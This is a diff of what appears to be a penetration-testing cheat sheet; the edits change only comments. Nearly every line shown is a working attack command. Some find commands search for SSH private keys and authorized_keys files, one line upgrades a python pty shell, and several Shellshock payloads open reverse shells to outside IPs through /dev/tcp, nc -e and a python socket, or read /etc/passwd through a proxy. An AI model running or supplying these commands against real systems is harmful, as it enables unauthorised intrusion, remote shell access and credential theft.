@@ -97,7 +97,7 @@ find /var/log -type f -exec ls -la {} \; 2>/dev/null
 find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" 2>/dev/null |xargs -r ls -la
 
 
-# trusty python shell upgrade 
+# python pty
 python -c 'import pty;pty.spawn("/bin/bash")'
 
 
@@ -130,11 +130,11 @@ curl -H "User-agent: () { :; }; /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1" http:
 	$ echo "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc 192.168.56.118 80
 
 
-# wget shellshock one liner through a proxy (from the droopy vm is this syntax)
+# wget shellshock one liner through a proxy 
 
 wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=yes -e http_proxy=192.168.57.101:3128 http://127.0.0.1/cgi-bin/status
 
-# same as above except using the python reverse method
+# same as above except using the python reverse 
 
 wget -qO- -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.57.102\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2>&1" -e use_proxy=yes -e http_proxy=192.168.57.101:3128 http://127.0.0.1/cgi-bin/status
 
